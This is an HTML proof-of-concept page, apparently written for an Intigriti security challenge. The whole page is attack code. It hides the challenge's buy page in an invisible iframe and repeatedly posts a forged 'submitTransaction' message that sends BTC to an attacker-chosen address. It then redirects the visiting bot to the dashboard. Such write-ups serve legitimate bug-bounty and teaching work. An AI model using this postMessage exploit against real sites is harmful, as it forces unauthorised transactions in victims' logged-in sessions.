<!DOCTYPE html>
<html>
<body>
    <iframe id="target" src="https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1" width="0" height="0"></iframe>
    <script>
        const ifr = document.getElementById('target');
        
        function send() {
            ifr.contentWindow.postMessage({
                type: 'submitTransaction',
                transaction: { toAddress: '0x1337', currency: 'BTC', amount: 0.000001 }
            }, '*');
        }

        // Send the message every second for 10 seconds
        let interval = setInterval(send, 1000);

        // After 10 seconds, move the WHOLE bot to the dashboard
        setTimeout(() => {
            clearInterval(interval);
            window.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
        }, 10000);
    </script>
</body>
</html>
